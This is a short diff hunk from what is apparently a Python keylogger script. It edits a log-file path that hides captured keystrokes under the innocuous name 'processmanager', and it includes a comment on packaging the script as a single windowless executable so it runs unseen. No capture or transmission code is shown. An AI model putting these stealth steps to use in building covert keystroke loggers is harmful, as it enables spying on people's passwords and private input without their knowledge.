@@ -11,7 +11,7 @@ keys = []
 count = 0
 
 path = "processmanager.txt" # For linux machines
-#path = os.environ["appdata"] + "\\processmanager.txt" # For windows machines
+#path = os.environ["appdata"] + "\\processmanager" # For windows machines
 # Install with pyinstaller keylogger.py --onefile --no-console
 
 def write_file(keys):
